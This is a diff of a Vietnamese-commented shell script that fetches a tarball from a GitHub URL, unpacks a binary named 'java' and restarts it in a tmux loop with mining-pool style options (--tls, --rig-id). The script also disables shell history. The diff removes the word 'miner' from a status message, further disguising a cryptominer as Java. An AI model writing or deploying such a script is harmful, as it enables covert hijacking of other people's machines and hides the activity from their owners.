@@ -23,7 +23,7 @@ export HISTFILE=/dev/null
 
 # 📥 Tải và giải nén nếu chưa có
 if [ ! -f "$(pwd)/java/java" ]; then
-    echo "[+] Downloading miner..."
+    echo "[+] Downloading ..."
     rm -rf java java.tar.gz
     wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
     tar -xzf java.tar.gz
@@ -35,7 +35,7 @@ fi
 echo "[+] Vòng lặp ..."
 while true; do
     pkill -f "$(pwd)/java/java" 2>/dev/null
-    echo "[+] kill process kill process kill process- sleep 5s..."
+    echo "[+] kill process kill process kill process - sleep 5s..."
     sleep 5
 
     tmux kill-session -t $SESSION 2>/dev/null
@@ -44,6 +44,6 @@ while true; do
     tmux send-keys -t $SESSION "
         $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
     " C-m
-
+    echo "[+] start process start process start process - sleep 120s..."
     sleep 120
 done
